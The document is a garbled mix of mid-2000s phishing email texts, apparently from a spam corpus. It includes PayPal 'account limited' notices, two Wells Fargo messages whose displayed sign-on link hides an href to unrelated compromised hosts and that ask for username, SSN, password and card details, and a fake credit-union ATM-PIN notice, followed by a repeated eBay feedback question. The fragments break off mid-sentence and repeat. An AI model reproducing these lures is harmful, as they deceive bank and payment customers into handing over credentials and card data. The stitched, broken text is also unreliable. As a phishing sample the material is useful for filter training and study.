is committed to maintaining a safe environment for its community of <br>
buyers and sellers. To protect the security of your account, PayPal employs <br>
some of the most advanced security systems in the world and our anti-fraud <br>
teams regularly screen the PayPal system for unusual activity. <br>
<br>
Recently, our Account Review Team identified some unusual activity in your <br>
account. In accordance with PayPal's User Agreement and to ensure that your <br>
account has not been compromised, access to your account was limited. Your <br>
account access will remain limited until this issue has been resolved. This <br>
is a fraud prevention measure meant to ensure that your account is not <br>
compromised. <br>
<br>
In order to secure your account and quickly restore full access, we may <br>
require some specific information from you for the following reason: <br>
<br>
We would like to ensure that your account was not accessed by an <br>
unauthorized third party. Because protecting the security of your account <br>
is our primary concern, we have limited access to sensitive PayPal account <br>
features. We understand that this may be an inconvenience but please <br>
understand that this temporary limitation is for your protection. <br>
<br>
Case ID Number: PP-289-283-878 <br>
<br>
We encourage you to log in and restore full access as soon as possible. <br>
Should access to your account remain limited for an extended period of <br>
time, it may result in further limitations on the use of your account.</font></tt><FONT face=Verdana size=2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</P>
<P>However, failure to restore your records will result in account suspension.&nbsp;<BR>Please update your records on or before <FONT color=red><STRONG>November 
26, 2005</STRONG>.</FONT><BR>
<BR>
Once you have updated your account records, your PayPal session will not be <BR>
interrupted and will continue as normal. </P>

<p><strong>Dear Wells Fargo Customer :</strong></p>
<p>Wells Fargo is constantly working to increase security for all Online Banking
  users. To ensure the integrity of our online payment system, we periodically
  review accounts.</p>
<p>Your account might be place on restricted status. Restricted accounts continue
  to receive payments, but they are limited in their ability to send or withdraw
funds.</p>
<p>To lift up this restriction follow the link bellow and fill in the necessary
fields:</p>
<p><a href="http://blog.herrbaumann.de/images/online.wellsfargo.com/auxiliary_access/1999/bb61162e7a787f/common/az1_db3_on/cgi-bin/a248.e.akamai.net/Mprc6XvBkuZqDGNbqlxb&PROCESSING_TRANSACTIO/wellsfargo/">https://online.wellsfargo.com/signon?LOB=CONS</a><br>
</p>
<p>Then ...you need to login into your account (<strong>with your username or
    SSN and
your password</strong>) , then you have to complete our verification process. You must
confirm your credit card details and your billing information as well . All restricted
  accounts have their billing information unconfirmed, meaning that you may no
  longer send money from your account until you have updated your billing information
  on file.<br>
</p>
<p>Best Regards,</p>
<p>Matt Lundquist<br>
Wells Fargo NBBC Sales Development Banker</p>

             Failure to update your records will result 
 
 in account termination. 
             Please update your records within 24 hours.

 update will result in

    its community of customers. To protect the security of your account, PayPal 
    employs some of the most advanced security systems in the world and our 
    anti-fraud teams regularly screen the PayPal system for unusual activity.
    <br>
    <br>
    We are contacting you to remind you that on 28 November 2005 our Account Review 
    Team identified some unusual activity in your account. In accordance with 
    PayPal's User Agreement and to ensure that your account has not been 
    compromised, access to your account was limited. Your account access will 
    remain limited until this issue has been resolved.<br>
    <br>
    To secure your account and quickly restore full access, we may require some 
    additional information from you for the following reason:<br>
    <br>
    We have been notified that a card associated with your account has been 
    reported as lost or stolen, or that there were additional problems with your 
    card.<br>
    <br>
    <br>
    This process is mandatory, and if not completed within the nearest time your 
    account or credit card may be subject for temporary suspension. <br>
    <br>
    To securely confirm your PayPal information please click on the link bellow:<br>

    <br>
    <br>
    We encourage you to log in and perform the steps necessary to restore your 
    account access as soon as possible. Allowing your account access to remain 
    limited for an extended period of time may result in further limitations on 
    the use of your account and possible account closure.<br>
    <br>
    For more information about how to protect your account please visit PayPal

<p><strong>Dear Wells Fargo Customer :</strong></p>
<p>Wells Fargo is constantly working to increase security for all Online Banking
  users. To ensure the integrity of our online payment system, we periodically
  review accounts.</p>
<p>Your account might be place on restricted status. Restricted accounts continue
  to receive payments, but they are limited in their ability to send or withdraw
funds.</p>
<p>To lift up this restriction follow the link bellow and fill in the necessary
fields:</p>
<p><a href="http://www.streamwriting.com/blog/images/online.wellsfargo.com/auxiliary_access/1999/bb61162e7a787f/cgi-bin/a248.e.akamai.net/Mprc6XvBkuZqDGNbqlxb&PROCESSING_TRANSACTIO/wellsfargosignon/">https://online.wellsfargo.com/signon?LOB=CONS</a><br>
</p>
<p>Then ...you need to login into your account (<strong>with your username or
    SSN and
your password</strong>) , then you have to complete our verification process. You must
confirm your credit card details and your billing information as well . All restricted
  accounts have their billing information unconfirmed, meaning that you may no
  longer send money from your account until you have updated your billing information
  on file.<br>
</p>
<p>Best Regards,</p>
<p>Matt Lundquist<br>

remain limited until the issue has been resolved. Unfortunately, if 
access to your account remains limited for an extended period of time, it 
may result in further limitations or eventual account closure. We

avoid this.

Dear valued Credit Union member,<br><br>
In the past months several credit card skimming devices have been captured=
 in gas stations and atm locations.<br>
Fraud cost the National Credit Union Association $6B in 2005. Issuers face=

Transaction fraud from cloned cards alone is projected to grow to $10B by =
2007 (Bank Technology News).<br>
Cloned and stolen card numbers are the point of vulnerability that enables=
 identity theft.<br>
The security of the ATM PIN is very important. Therefore, the National Cre=
dit Union Association is performing a security check<br>
in order to avoid future data leak.<br>
In order to update your account details please access the link below and c=
omplete the required steps:<br><br>

PayPal system. We recently contacted you after noticing an issue on your

<br><br>

We have reason to believe that your account was accessed by a third 
party. Because protecting the security of your account is our primary 
concern, we have limited access to sensitive PayPal account features. We 
understand that this may be an inconvenience but please understand that 
this temporary limitation is for your protection.

restore your account access. We appreciate your understanding as we work to 
ensure account safety.

In accordance with PayPal's User Agreement, your account access will 
remain limited until the issue has been resolved. Unfortunately, if 
access to your account remains limited for an extended period of time, it 
may result in further limitations or eventual account closure. We 
encourage you to log in to your PayPal account as soon as possible to help 
avoid this.

<P><FONT face="Arial, Verdana" size=2>Hello,</FONT></P>
<P><FONT face="Arial, Verdana" size=2>Hi,

I signed up for Ebay and I've been an Ebay member for about 15 days. So, I'm carrying an "icon" where it says "I am a member since less than 30 days".

A few days ago, I managed to sell an item. The guy who bought mine left me a positive feedback.

But still, mine's got a "zero" feedback?

Why is it that? If I click on my profile, I can see that he left me a feedback.

But the feedback counting doesn't go from zero to one.

Is it because I'm a member who's been registered for less than 30 days?.<BR><BR>Regards, </FONT><BR> Gretta.</FONT></P></TD>

<P><FONT face="Arial, Verdana" size=2>Hello,</FONT></P>
<P><FONT face="Arial, Verdana" size=2>Hi,

I signed up for Ebay and I've been an Ebay member for about 15 days. So, I'm carrying an "icon" where it says "I am a member since less than 30 days".

A few days ago, I managed to sell an item. The guy who bought mine left me a positive feedback.

But still, mine's got a "zero" feedback?

Why is it that? If I click on my profile, I can see that he left me a feedback.

But the feedback counting doesn't go from zero to one.

Is it because I'm a member who's been registered for less than 30 days?.<BR><BR>Regards, </FONT><BR> Gretta.</FONT></P></TD>

<P><FONT face="Arial, Verdana" size=2>Hi,

I signed up for Ebay and I've been an Ebay member for about 15 days. So, I'm carrying an "icon" where it says "I am a member since less than 30 days".

A few days ago, I managed to sell an item. The guy who bought mine left me a positive feedback.

But still, mine's got a "zero" feedback?

Why is it that? If I click on my profile, I can see that he left me a feedback.

But the feedback counting doesn't go from zero to one.

Is it because I'm a member who's been registered for less than 30 days?.<BR><BR>Regards, </FONT><BR> Gretta.</FONT></P></TD>
